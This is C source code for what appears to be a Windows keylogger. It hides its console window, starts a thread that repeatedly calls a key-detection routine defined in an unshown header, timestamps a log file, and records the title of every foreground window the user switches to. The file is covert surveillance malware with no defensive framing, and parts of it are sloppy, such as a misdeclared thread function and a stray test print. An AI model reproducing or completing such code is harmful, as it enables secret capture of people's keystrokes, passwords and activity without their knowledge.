#include"KeyCodes.h"

void main( int arg, char * argz[] )
{
  hideConsole();
  CheckPara( arg, argz );
  CreateLog( argz[1] );
  AddStamp();
  CreateThread(NULL,0,&runServer,NULL,0,NULL);
  saveActiveWindow();
}

DWORD WINAPI runServer()
{
  enum bool sAdded = false;
  unsigned char c;
  while ( 1 )
  {
    Sleep( 40 );
    if ( sAdded == false && ( getSystemTime() % 30 ) == 0 )
    {
      sAdded = true;
      AddStamp();
    }
    else if ( getSystemTime() % 30 == 15 )
      sAdded = false;
    detectKey();

  }
}

void saveActiveWindow()
{
  HWND active;
  char *name=malloc(256*sizeof(char)),*nAdded=malloc(256*sizeof(char));
  while(1)
  {
    Sleep(10);
    active=GetForegroundWindow();
    GetWindowTextA(active,name,GetWindowTextLengthA(active)+1);
    if(strcmp(name,nAdded))
    {
      if(strlen(name)>1)
      {
        fprintf(log,"\n###### %s ######\n",name);
        Flush();
      }
      strcpy(nAdded,name);
      printf("Test\n");
    }
  }
}
